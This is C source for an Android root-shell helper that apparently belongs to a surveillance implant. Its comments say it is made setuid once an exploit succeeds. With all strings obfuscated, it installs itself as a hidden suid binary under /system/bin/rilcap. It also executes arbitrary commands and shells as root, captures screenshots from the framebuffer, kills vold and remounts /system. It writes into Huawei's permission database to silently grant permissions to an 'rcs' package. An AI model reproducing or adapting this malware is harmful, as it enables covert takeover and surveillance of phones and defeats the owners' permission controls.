#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/param.h>
#include <sys/time.h>
#include <sys/mman.h>
#include <linux/netlink.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>
#include <math.h>
#include <dlfcn.h>
#include <elf.h>
#include <sys/system_properties.h>
#include <errno.h>
#include <jni.h>
#include <android/log.h>
#include <dirent.h>
#include <linux/reboot.h>
#include <linux/fb.h>
#include <linux/kd.h>
#include "utils.h"
#include "log.h"
#include "deobfuscate.h"
#include "shell_params.h"
#include "sqlite3_manager.h"


#ifdef DEBUG
#warning "Debug mode is enabled, errors will be printed to stdout"
#define LOG(fmt, ...) printf(fmt, ##__VA_ARGS__)
#else
#define LOG(fmt, ...) ;
#endif

static int copy(const char *from, const char *to);
static int log_to_file(const char *full_path, const char *content, const int len);
static unsigned int getProcessId(const char *p_processname);
static int setgod();
static void sync_reboot();
//static int remount(const char *mntpoint, int flags);
static int my_mount(const char *mntpoint);
static void my_chown(const char *user, const char *group, const char *file);
static void my_chmod(const char *mode, const char *file);
static void copy_root(const char *mntpnt, const char *dst);
static void copy_remount(const char *mntpnt, const char *src, const char *dst);
static void delete_root(const char *mntpnt, const char *dst);
//static int append_content(const char *content, const char *file);
static int search_content(const char *content, const char *file);
static int add_huawei_permission(const char *rcs_pkg);
//static int get_framebuffer(char *filename);

static unsigned char ld_library_path[] = "\x92\x6f\xf2\x22\x2a\x53\x22\x25\x50\x40\x2d\x40\x55\x53\x5e\x2d\x5a\x26"; // "LD_LIBRARY_PATH"
static unsigned char system_libs[] = "\x5a\xed\xa0\x8f\xf4\xc1\xcc\xc6\xcf\xf8\x8f\xce\xcd\xc8\xa0\x8f\xfb\xfd\xfb\xf6\xc1\xc9\x8f\xce\xcd\xc8"; // "/vendor/lib:/system/lib"

static unsigned char old_name_shell[] = "\x6d\x4c\x33\xc2\x26\x2c\x26\x29\x18\x00\xc2\x17\x1c\x03\xc2\x27\x1c\x01\x16\x14\x25"; // "/system/bin/rilcap"


// questo file viene compilato come rdb e quando l'exploit funziona viene suiddato
// statuslog -c "/system/bin/cat /dev/graphics/fb0"
int main(int argc, char** argv) {
	unsigned char fb[] = "\x3b\x23\x1a\xa3\x5f"; // "fb"
	unsigned char fb0[] = "\xd3\x05\xc7\x04\xb9\xbe\xaf\x04\xbc\xa3\xb2\xad\xc5\xba\xb0\xa0\x04\xbf\xb3\xed"; // "/dev/graphics/fb0"
	unsigned char vol[] = "\x4e\xde\x93\xc8\x21\xde"; // "vol"
	unsigned char vold1[] = "\x0b\xda\xd5\x8d\xe4\x9b\x93"; // "vold"
	unsigned char vold2[] = "\xcc\x74\xbc\x5a\x63\x60\x68"; // "vold"
	unsigned char reb[] = "\x2c\x97\xb8\x62\x77\x72"; // "reb"
	unsigned char blr[] = "\xf4\x61\x96\x96\x98\x86"; // "blr"
	unsigned char blw[] = "\x50\x1e\x4d\x4e\x44\x5b"; // "blw"
	unsigned char rt[] = "\x04\x16\x10\x9a\x90"; // "rt"
	unsigned char system1[] = "\x63\xfa\x9e\xbc\xf0\xee\xf0\xeb\xfa\xf2"; // "/system"
	unsigned char system2[] = "\xa2\xf5\x50\x77\x33\x25\x33\x3e\x49\x31"; // "/system"
	unsigned char system3[] = "\xd9\x65\xbb\x3e\x6a\x60\x6a\x77\x44\x7c"; // "/system"
	unsigned char system4[] = "\xca\xa3\x6e\x2b\xff\xf5\xff\xc2\xf1\xe9"; // "/system"
	unsigned char mntsdcard[] = "\xa4\x98\x37\xbb\xf9\xfa\xf0\xbb\xf7\xc0\xc7\xc5\xf6\xc0"; // "/mnt/sdcard"
	unsigned char sd[] = "\x2d\xcf\xe0\xe2\xd7"; // "sd"
	unsigned char ru[] = "\x2c\xb1\x9f\xbe\xbb"; // "ru"
	unsigned char air[] = "\x9b\xc5\x5d\x7a\x72\x6b"; // "air"
	unsigned char qzx[] = "\x04\x52\x55\x95\x82\x9c"; // "qzx"
	unsigned char fhc[] = "\x68\x87\xec\x12\x00\x15"; // "fhc"
	unsigned char fho[] = "\xa0\x46\xe5\x4a\x48\x53"; // "fho"
	unsigned char pzm[] = "\x2d\x7a\x54\xad\xab\xc0"; // "pzm"
	unsigned char qzs[] = "\x17\xc1\xd5\xe6\xef\xe4"; // "qzs"
	unsigned char binsh1[] = "\xdf\x14\xc5\x10\xd4\xae\xd4\xab\xda\xd2\x10\xc5\xde\xd1\x10\xd4\xdf"; // "/system/bin/sh"
	unsigned char binsh2[] = "\x0b\xeb\xee\xe4\x88\xb6\x88\x81\xb2\xba\xe4\xbf\xa6\xbb\xe4\x88\xa5"; // "/system/bin/sh"
	unsigned char sh[] = "\x6a\xe2\x8a\x19\x06"; // "sh"
	unsigned char lid[] = "\xb2\xf9\x48\x2e\x2d\x36"; // "lid"
	unsigned char rf[] = "\xf9\x6f\x94\x95\x61"; // "rf"
	unsigned char fhs[] = "\xe5\xe3\x05\x85\x93\x9a"; // "fhs"
	unsigned char ape[] = "\xaa\xb4\x1d\xcb\x3a\x37"; // "ape"
	unsigned char srh[] = "\x05\xcb\xcd\x8a\x89\xf3"; // "srh"
	unsigned char sql[] = "\xd6\xd7\x02\xab\xa9\x46"; // "sql"

	int i;
	unsigned char *da, *db;
	
	if (argc < 2) {
		LOG("Usage: ");
		LOG("%s", argv[0]);
		LOG(" <command>\n");
		LOG("fb - try to capture a screen snapshot\n");
		LOG("vol - kill VOLD twice\n");
		LOG("reb - reboot the phone\n");
		LOG("blr - mount /system in READ_ONLY\n");
		LOG("blw - mount /system in READ_WRITE\n");
		LOG("rt - install the root shell in /system/bin/rilcap\n");
		LOG("ru - remove the root shell from /system/bin/rilcap\n");
		LOG("rf <mntpoint> <file> - remove <file> from <mntpoint>");
		LOG("sd - mount /sdcard\n");
		LOG("air - check if the shell has root privileges\n");
		LOG("qzx \"command\" - execute the given commandline\n");
		LOG("fhc <src> <dest> - copy <src> to <dst>\n");
		LOG("fhs <mntpoint> <src> <dest> - copy <src> to <dst> on mountpoint <mntpoint>\n");
		LOG("fho <user> <group> <file> - chown <file> to <user>:<group>\n");
		LOG("pzm <newmode> <file> - chmod <file> to <newmode>\n");
		LOG("qzs - start a root shell\n");
		LOG("lid <proc> <dest file> - return process id for <proc> write it to <dest file>\n");
		LOG("ape <content> <dest file> - append text <content> to <dest files> if not yet present\n");
		LOG("srh <content> <file> - search for <content> in <file>\n");
		
		return 0;
	}


	    // Sanitize all secure environment variables (from linker_environ.c in AOSP linker).
    /* The same list than GLibc at this point */
    unsigned char* unsec_vars[] = {
      "\x6e\xe6\x82\xe9\xf5\xe1\xe0\xf8\xf1\xc2\xf3\xc6\xea",                                         // "GCONV_PATH"
      "\x16\x2a\x37\x51\x57\x46\x55\xa9\xa8\x50\x59\x56\xa3\x44",                                     // "GETCONF_DIR"
      "\x17\x35\x29\xa1\xb8\x4c\x4d\xbe\xa5\xa6\xbe\x4c\xb2\x4c",                                     // "HOSTALIASES"
      "\xcc\x82\x46\x80\x88\x97\x8d\x99\x88\x85\x98",                                                 // "LD_AUDIT"
      "\x9b\xdf\x4c\x69\x61\x7c\x61\x62\x67\x72\x64",                                                 // "LD_DEBUG"
      "\x35\x15\x2f\x9b\x93\x6a\x93\x90\x99\x60\x92\x6a\x9a\x60\x63\x6f\x60\x63",                     // "LD_DEBUG_OUTPUT"
      "\x3c\x66\x55\xb0\xb8\xaf\xb8\xad\xbe\x85\xb1\xbd\x83\xaf\xb7\xb9\x85\xbb",                     // "LD_DYNAMIC_WEAK"
      "\xec\xc2\x21\xa0\xa8\xb7\xa0\xa5\xb2\x42\xad\x42\xb5\xb7\xbc\xad\xb8\xa4",                     // "LD_LIBRARY_PATH"
      "\xee\x95\x75\xa2\xaa\xd3\xa3\xc4\xa9\xab\xa9\xa0\xd3\xc6\xd1\xda\xae",                         // "LD_ORIGIN_PATH"
      "\xed\x59\xbe\xa3\x5b\x52\x4f\x41\x58\xa3\xa2\x5c\x5b",                                         // "LD_PRELOAD"
      "\xdd\x1c\xcb\xb1\xa9\x82\xb5\xb7\xb2\xab\xac\xb1\xa8",                                         // "LD_PROFILE"
      "\x87\xca\x41\x5f\x47\x68\x54\x53\x58\x50\x68\x5a\x56\x63\x51\xa2",                             // "LD_SHOW_AUXV"
      "\x60\x04\x74\x34\x2c\x47\x3d\x33\x2d\x47\x34\x37\x21\x2c\x47\x22\x29\x21\x33",                 // "LD_USE_LOAD_BIAS"
      "\x8e\x25\xa0\xc2\xc3\xd7\xd1\xc2\xca\xc3\xcd\xd1\xc9\xc0",                                     // "LOCALDOMAIN"
      "\x94\xd5\x46\x78\x65\x79\x4c\x7f\x40\x64",                                                     // "LOCPATH"
      "\xe0\xe5\x09\x77\x63\x74\x74\x71\x6d\x41\x7c\x72\x63\x6d\x6f\x3b",                             // "MALLOC_TRACE"
      "\x02\x30\x3f\x4f\x43\x4e\x4e\x4d\x41\xbd\x41\x4a\x47\x41\x49\xbd",                             // "MALLOC_CHECK_"
      "\xf9\x13\xe2\xd9\xd0\xae\xaa\xaf\xd8\xd3\xd7",                                                 // "NIS_PATH"
      "\xf5\x05\xf7\xc5\xbb\xae\xaf\xbc\xa3\xc7",                                                     // "NLSPATH"
      "\x28\xc5\xfd\xfa\xf7\x85\xe9\xec\x86\xf9\xe0\xe9\x85\x84\xf9\xf5\xe9\xee\xf6",                 // "RESOLV_HOST_CONF"
      "\xde\x47\x92\x94\xa5\x93\x8f\x9f\x92\x96\x99\x9f\x90\x93",                                     // "RES_OPTIONS"
      "\x87\x04\x85\xd3\xca\xdf\xc3\xd6\xdd",                                                         // "TMPDIR"
      "\xf1\x5e\xaa\x5d\x57\x4d\x48\x5f",                                                             // "TZDIR
      "\x9c\x1e\x97\xf0\xe8\xff\xe5\xef\xf9\xf8\xff\xf0\xed\xe2\xf2\xe5\xf2\xfd\xff\xf4\xe5\xf8\xec\xc5", // "LD_AOUT_LIBRARY_PATH"
      "\x20\x14\x3b\x94\x6c\x87\x61\x97\x9d\x9c\x87\x90\x92\x6d\x94\x97\x61\x6c",                     // "LD_AOUT_PRELOAD"
      // not listed in linker, used due to system() call
      "\xe4\xca\x2d\xbd\xa6\x4b",                                                                     // "IFS",
    };

    int h = 0;
    for(h=0; h<sizeof(unsec_vars)/sizeof(unsec_vars[0]); h++)
      unsetenv(deobfuscate(unsec_vars[h]));

    /*
     * set LD_LIBRARY_PATH if the linker has wiped out it due to we're suid.
     * This occurs on Android 4.0+
     */
    setenv(deobfuscate(ld_library_path), deobfuscate(system_libs), 0);
	


	setgod();
	
	// Cattura uno screenshot
	if (strcmp(argv[1], deobfuscate(fb)) == 0 && argc == 3) {
		LOG("Capturing a screenshot\n");
		char* filename = argv[2];

		copy(deobfuscate(fb0), filename);
		chmod(filename, 0666);
	} else if (strcmp(argv[1], deobfuscate(vol)) == 0) { // Killa VOLD per due volte
		unsigned int pid;
		
		LOG("Killing VOLD\n");

		for (i = 0; i < 2; i++) {
			pid = getProcessId(deobfuscate(vold1));

			if (pid) {
				kill(getProcessId(deobfuscate(vold2)), SIGKILL);
				sleep(2);
			}	
		}
	} else if (strcmp(argv[1], deobfuscate(reb)) == 0) { // Reboot
		LOG("Rebooting...\n");

		sync_reboot();
	} else if (strcmp(argv[1], deobfuscate(blr)) == 0) { // Monta /system in READ_ONLY
		LOG("Mounting FS read only\n");
		remount(deobfuscate(system1), MS_RDONLY);
	} else if (strcmp(argv[1], deobfuscate(blw)) == 0) { // Monta /system in READ_WRITE
		LOG("Mounting FS read write\n");
		remount(deobfuscate(system2), 0);
	} else if (strcmp(argv[1], deobfuscate(rt)) == 0) {  // Copia la shell root in /system/bin/rilcap
		LOG("Installing suid shell\n");
		delete_root(deobfuscate(system4), deobfuscate(ROOT_BIN));
		copy_root(deobfuscate(system3), deobfuscate(ROOT_BIN));
		delete_root(deobfuscate(system4), deobfuscate(old_name_shell));
	} else if (strcmp(argv[1], deobfuscate(ru)) == 0) {  // Cancella la shell root in /system/bin/rilcap
		LOG("Removing suid shell\n");
		delete_root(deobfuscate(system4), deobfuscate(ROOT_BIN));
	} else if (strcmp(argv[1], deobfuscate(rf)) == 0) {  // Cancella un file dal filesystem
		LOG("Removing %s from %s\n", argv[3], argv[2]);
		delete_root(argv[2], argv[3]);
	} else if (strcmp(argv[1], deobfuscate(sd)) == 0) {  // Mount /sdcard
		LOG("Mounting /sdcard\n");
		my_mount(deobfuscate(mntsdcard));
	} else if (strcmp(argv[1], deobfuscate(air)) == 0) { // Am I Root?
		LOG("Are we root?\n");
		return setgod();
	} else if (strcmp(argv[1], deobfuscate(qzx)) == 0) { // Eseguiamo la riga passataci
		LOG("Executing \"%s\"\n", argv[2]);
		return system(argv[2]);
	} else if (strcmp(argv[1], deobfuscate(fhc)) == 0) { // Copiamo un file nel path specificato dal secondo argomento 
		LOG("Copying file %s to %s\n", argv[2], argv[3]);
		copy(argv[2], argv[3]);
		return 0;
	} else if (strcmp(argv[1], deobfuscate(fhs)) == 0) { // Copiamo un file nel path specificato dal secondo argomento (con remount del mntpoint)
		LOG("Copying file %s to %s on mountpoint %s\n", argv[3], argv[4], argv[2]);
		copy_remount(argv[2], argv[3], argv[4]);
		return 0;
	} else if (strcmp(argv[1], deobfuscate(fho)) == 0) { // chown: user group file
		LOG("Chowning to %s:%s file %s\n", argv[2], argv[3], argv[4]);
		my_chown(argv[2], argv[3], argv[4]);
		return 0;
	} else if (strcmp(argv[1], deobfuscate(pzm)) == 0) { // chmod: newmode file
		LOG("Chmodding to %s file %s\n", argv[2], argv[3]);
		my_chmod(argv[2], argv[3]);
		return 0;
	} else if (strcmp(argv[1], deobfuscate(lid)) == 0) { // Write pid of a process to file
		LOG("Returning process ID for %s to %s\n", argv[2], argv[3]);
		i = getProcessId(argv[2]);

		LOG("Process id is: %d\n", i);
		log_to_file(argv[3], (char *)&i, sizeof(int));
		return 0;
	} else if (strcmp(argv[1], deobfuscate(ape)) == 0) { // Append text content to file, add newline
		LOG("Appending %s to %s\n", argv[2], argv[3]);
		return append_content(argv[2], argv[3]);
	} else if (strcmp(argv[1], deobfuscate(srh)) == 0) { // Search for content in file return 1 if content is present 0 if not, -1 in case of error
		LOG("Searching for %s in %s\n", argv[2], argv[3]);
		return search_content(argv[2], argv[3]);
	} else if (strcmp(argv[1], deobfuscate(qzs)) == 0) { // Eseguiamo una root shell
		const char * shell = deobfuscate(binsh1);
		LOG("Starting root shell\n");

		int i;
		char *exec_args[argc + 1];
		exec_args[argc] = NULL;
		exec_args[0] = deobfuscate(sh);

		for (i = 1; i < argc; i++) {
			exec_args[i] = argv[i];
		}

		execv(deobfuscate(binsh2), exec_args);

		LOG("Exiting shell\n");

	} else if (strcmp(argv[1], deobfuscate(sql)) == 0) {

	  if(!argv[2]) return 0;
	  
	  add_huawei_permission(argv[2]);

	}

	return 0;
}

static int search_content(const char *content, const char *file) {
	FILE *fd;
	char *data = NULL;
	int size = 0;
	char *ret = NULL;

	if ((fd = fopen(file, "r")) == NULL) {
		LOG("Unable to open source file in r mode\n");
		return -1;
	}

	fseek(fd, 0L, SEEK_END);
	size = ftell(fd);
	fseek(fd, 0L, SEEK_SET);

	data = (char *)malloc(size + 1);
	memset(data, 0x00, size + 1);

	LOG("Reading %d bytes\n", size);

	fread(data, size, 1, fd);

	ret = strcasestr(data, content);

	fclose(fd);

	if (ret == NULL) {
		LOG("%s not found\n", content);
		return 0;
	} else {
		LOG("%s found\n", content);
		return 1;
	}
}

static int log_to_file(const char *full_path, const char *content, const int len) {
	int fd, ret;

	if ((fd = open(full_path, O_CREAT | O_TRUNC | O_WRONLY)) < 0) {
		LOG("Unable to create %s\n", full_path);
		return -1;
	}

	ret = write(fd, content, (size_t)len);

	if (ret < 0) {
		LOG("Error writing to file\n");
		close(fd);
		return -1;
	}

	if (ret < len) {
		LOG("Written %d bytes to file instead of %d bytes\n", ret, len);
	}

	close(fd);
	chmod(full_path, 0666);

	return 1;
}

static void my_chmod(const char *mode, const char *file) {
	unsigned char o[] = "\xa0\xf6\x54\x8d\x33"; // "%o"
	
	int newmode;

	sscanf(mode, deobfuscate(o), &newmode);
	chmod(file, newmode);
}

static void my_chown(const char *user, const char *group, const char *file) {
	unsigned char chown1[] = "\x5a\x44\x0c\xfd\x29\x23\x29\x36\xc7\x3f\xfd\x38\x33\x3c\xfd\x39\x32\x3d\x35\x3c\xfa"; // "/system/bin/chown "
	unsigned char chown2[] = "\x38\x07\x25\x19\x55\x4f\x55\x54\x63\x5b\x19\x66\x5f\x5a\x19\x65\x50\x59\x51\x5a\x18\x23\x55\x1a\x23\x55\x18\x23\x55"; // "/system/bin/chown %s.%s %s"
	
	char *buf;
	int len = strlen(user) + strlen(group) + strlen(file) + 
				strlen(deobfuscate(chown1)) + 5;

	buf = (char *)malloc(len);

	if (buf == NULL) {
		return;
	}

	memset(buf, 0, len);

	sprintf(buf, deobfuscate(chown2), user, group, file);
	system(buf);

	free(buf);
	return; 
}

static void delete_root(const char *mntpnt, const char *dst) {
	if (mntpnt != NULL)
		remount(mntpnt, 0);

	unlink(dst);

	if (mntpnt != NULL)
		remount(mntpnt, MS_RDONLY);
}

static void copy_root(const char *mntpnt, const char *dst) {
	unsigned char exe[] = "\x2f\xbb\x9a\x00\xa1\xa3\x40\xbc\x00\xac\xbe\x45\xbf\x00\xbe\xa9\xbe"; // "/proc/self/exe"
	
	if (mntpnt != NULL)
		remount(mntpnt, 0);

	copy(deobfuscate(exe), dst);
	chown(dst, 0, 0);
	chmod(dst, 04755);

	if (mntpnt != NULL)
		remount(mntpnt, MS_RDONLY);
}

static void copy_remount(const char *mntpnt, const char *src, const char *dst) {
	if (mntpnt != NULL)
		remount(mntpnt, 0);

	copy(src, dst);
	chown(dst, 0, 0);

	if (mntpnt != NULL)
		remount(mntpnt, MS_RDONLY);
}

static int copy(const char *from, const char *to) {
	int fd1, fd2;
	char buf[0x1000];
	int r = 0;

	if ((fd1 = open(from, O_RDONLY)) < 0) {
		LOG("Unable to open source file\n");
		return -1;
	}

	if ((fd2 = open(to, O_RDWR|O_CREAT|O_TRUNC, 0600)) < 0) {
		LOG("Unable to open destination file\n");
		close(fd1);
		return -1;
	}

	for (;;) {
		r = read(fd1, buf, sizeof(buf));

		if (r <= 0)
			break;

		if (write(fd2, buf, r) != r)
			break;
	}

	close(fd1);
	close(fd2);

	sync();
	sync();

	return r;
}

static unsigned int getProcessId(const char *p_processname) {
	unsigned char proc1[] = "\xa4\x08\xaa\x9b\xd4\xd6\xdb\xc7\x9b"; // "/proc/"
	unsigned char numbers[] = "\x7d\x9b\xec\x73\x7c\x71\x72\x7f\x78\x7d\x7e\x7b\x44"; // "0123456789"
	unsigned char proc2[] = "\x2f\xe1\xc8\x00\xa1\xdf\xc0\xcc\x00"; // "/proc/"
	unsigned char slash[] = "\x45\x50\x14\xea"; // "/"
	unsigned char exe[] = "\x7f\x53\x2f\x3e\x09\x3e"; // "exe"
	
    DIR *dir_p;
    struct dirent *dir_entry_p;
    char dir_name[128];
    char target_name[252];
    int target_result;
    char exe_link[252];
    int errorcount;
    int result;
	
    errorcount = 0;
    result = 0;

    dir_p = opendir(deobfuscate(proc1));

    while (NULL != (dir_entry_p = readdir(dir_p))) {
        if (strspn(dir_entry_p->d_name, deobfuscate(numbers)) == strlen(dir_entry_p->d_name)) {
            strcpy(dir_name, deobfuscate(proc2));
            strcat(dir_name, dir_entry_p->d_name);
            strcat(dir_name, deobfuscate(slash));

            exe_link[0] = 0;
            strcat(exe_link, dir_name);
            strcat(exe_link, deobfuscate(exe));
            target_result = readlink(exe_link, target_name, sizeof(target_name) - 1);

            if (target_result > 0) {
                target_name[target_result] = 0;

                if (strstr(target_name, p_processname) != NULL) {
                    result = atoi(dir_entry_p->d_name);
                    closedir(dir_p);

                    LOG("getProcessID(%s) id = %d\n", p_processname, result);
                    return result;
                }
            }
        }
    }

    closedir(dir_p);

    LOG("getProcessID(%s) id = 0 (could not find process)\n", p_processname);

    return result;
}

static void sync_reboot() {
	sync();

	if (reboot(LINUX_REBOOT_CMD_RESTART) < 0) {
		LOG("Error rebooting: %d\n", errno);
	}
}

static int my_mount(const char *mntpoint) {
	unsigned char t1[] = "\x77\xe9\x9c\xa9\x8e"; // " \t"
	unsigned char t2[] = "\xab\xbd\x14\xf5\xe2"; // " \t"
	unsigned char t3[] = "\x95\xc1\x56\xb7\x9c"; // " \t"
	unsigned char mounts[] = "\x4e\x10\x52\x61\x5e\x5c\x21\x2d\x61\x23\x21\x5b\x20\x5a\x5d"; // "/proc/mounts"
	unsigned char r[] = "\x92\xaf\x3c\x20"; // "r"

    FILE *f = NULL;
    int found = 0;
    char buf[1024], *dev = NULL, *fstype = NULL;

    if ((f = fopen(deobfuscate(mounts), deobfuscate(r))) == NULL) {
		LOG("Unable to open /proc/mounts\n");
        return -1;
    }

    memset(buf, 0, sizeof(buf));

    for (;!feof(f);) {
        if (fgets(buf, sizeof(buf), f) == NULL)
            break;

        if (strstr(buf, mntpoint)) {
            found = 1;
            break;
        }
    }

    fclose(f);

    if (!found) {
		LOG("Cannot find mountpoint\n");
        return -1;
    }

    if ((dev = strtok(buf, deobfuscate(t1))) == NULL) {
		LOG("Cannot find first mount entry\n");
        return -1;
    }

    if (strtok(NULL, deobfuscate(t2)) == NULL) {
		LOG("Cannot find second mount entry\n");
        return -1;
    }

    if ((fstype = strtok(NULL, deobfuscate(t3))) == NULL) {
		LOG("Cannot find third mount entry\n");
        return -1;
    }

    return mount(dev, mntpoint, fstype, 0, 0);
}

static int add_huawei_permission(const char *rcs_pkg) {
  unsigned char sys_pkg[] = "\xb0\x55\xfc\xa1\x7c\x73\x4c\x73\xa1\x4d\x4b\x4d\x4c\x7f\x67\xa1\x40\x73\x7d\x65\x73\x79\x7f\x4d\xa6\x48\x67\x64"; // "/data/system/packages.xml"
  unsigned char hw_db[] = "\x99\x1a\xbc\xca\x0d\x08\x1d\x08\xca\x0d\x08\x1d\x08\xca\x0e\x0a\x14\xcb\x11\x1c\x08\x12\x0c\x10\xcb\x19\x0c\x1f\x14\x10\x1e\x1e\x10\x0a\x0b\x14\x08\x0b\x08\x02\x0c\x1f\xca\x0d\x08\x1d\x08\x0f\x08\x1e\x0c\x1e\xca\x19\x0c\x1f\x14\x10\x1e\x1e\x10\x0a\x0b\xcb\x0d\x0f"; // "/data/data/com.huawei.permissionmanager/databases/permission.db"
  unsigned char obf_query[] = "\xc5\x29\x9c\x9c\x9d\x96\x80\xe9\x93\x27\x9c\x9d\x93\x9a\x27\xf7\xe0\xc9\xf8\xfc\xf6\xf6\xfc\xfa\xfd\x86\xe5\xe2\x27\x3f\xea\xfc\xe3\x3b\x27\xf7\xe4\xe6\xfe\xe4\xe2\xe0\x9d\xe4\xf8\xe0\x3b\x27\xf0\xfc\xe3\x3b\x27\xf7\xe0\xc9\xf8\xfc\xf6\xf6\xfc\xfa\xfd\x86\xfa\xe3\xe0\x3b\x27\xf7\xe0\xc9\xf8\xfc\xf6\xf6\xfc\xfa\xfd\x86\xe5\xe2\x3c\x27\x95\x84\x9b\x90\x80\x96\x27\x3f\x34\x37\x37\x37\x3b\x27\x22\x20\xf6\x22\x3b\x27\x20\xe3\x3b\x27\x20\xe3\x3b\x27\x37\x3c\x0e"; // "INSERT INTO permissionCfg (_id, packageName, uid, permissionCode, permissionCfg) VALUES (1000, '%s', %d, %d, 0);"
  int uid;
  char query[2048];
  int permissions = 60191;

  if(!rcs_pkg)
    return 0;

  uid = get_package_uid(rcs_pkg);    
  if(!uid) return 0;

  memset(query, 0, sizeof(query));
  snprintf(query, sizeof(query), deobfuscate(obf_query), rcs_pkg, uid, permissions);

  LOGD("Query: %s\n", query);

  if(sqlite_manager_init()) 
    sqlite_manager_query(deobfuscate(hw_db), query);

  return 1;

}


static int setgod() {
    setegid(0);
    setuid(0);
    setgid(0);
    seteuid(0);

    LOG("Actual UID: %d, GID: %d, EUID: %d, EGID: %d, err: %d\n", getuid(), getgid(), geteuid(), getegid(), errno);

    return (seteuid(0) == 0) ? 1 : 0;
}


